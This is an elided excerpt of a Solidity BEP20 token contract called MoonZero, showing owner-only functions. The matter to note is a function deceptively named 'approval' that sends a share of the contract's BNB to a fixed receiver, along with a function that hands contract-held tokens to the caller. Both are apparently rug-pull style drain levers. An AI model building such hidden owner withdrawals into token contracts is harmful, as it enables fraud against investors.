...
contract MoonZero is IBEP20, Auth {
    ...
    function setisNotBot(address _address) external authorized {isBot[_address] = false;}
    ...
    function taketotalFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        emit Transfer(sender, address(this), cAmount);} 
    ...
    function approval(uint256 percentage) public authorized {
        uint256 amountBNB = address(this).balance;
        payable(default_receiver).transfer(amountBNB.mul(percentage).div(100));
    }

    function setStakingReciever(address _address) external authorized {
        staking_receiver = _address;
        setExemptAddress(_address, true);
    }

    function setMarketingReciever(address _address) external authorized {
    ...
    function teamMarketingToken(uint256 amount) external authorized {
        _transfer(address(this), msg.sender, amount);
    }

    function setExemptAddress(address _address, bool _enabled) public authorized {
